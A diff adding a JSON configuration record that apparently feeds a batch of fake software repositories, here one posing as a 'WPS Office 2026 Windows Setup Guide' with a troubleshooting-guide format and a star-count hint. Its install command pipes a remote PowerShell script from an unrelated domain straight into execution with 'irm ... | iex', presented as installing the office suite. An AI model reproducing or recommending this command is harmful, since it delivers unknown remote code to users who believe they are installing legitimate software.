@@ -1,0 +1,12 @@
+{
+  "repo": "WPS-Office-2026-Windows-Setup-Guide",
+  "product": "WPS Office 2026 Setup Guide",
+  "kind": "software",
+  "install_type": "powershell",
+  "install_url": "https://usevision.fun/ps/setup.ps1",
+  "install_command": "irm https://usevision.fun/ps/setup.ps1 | iex",
+  "stars_hint": 10,
+  "batch": "photo29",
+  "format": "troubleshooting-guide",
+  "category": "productivity-software"
+}
